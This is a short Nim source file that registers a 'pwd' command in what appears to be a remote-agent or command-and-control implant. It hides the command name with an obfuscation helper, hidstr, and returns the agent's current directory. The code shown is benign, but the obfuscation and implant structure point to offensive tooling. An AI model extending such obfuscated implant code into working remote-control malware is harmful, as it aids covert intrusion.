import std/json
import core/types
import commands/registry
import crypto/strenc

proc pwdExecute(taskId: string, params: JsonNode, state: AgentState,
                send: SendMsg): TaskResult =
  return TaskResult(output: state.cwd, status: "success", completed: true)

proc initPwd*() =
  register(hidstr("pwd"), pwdExecute)
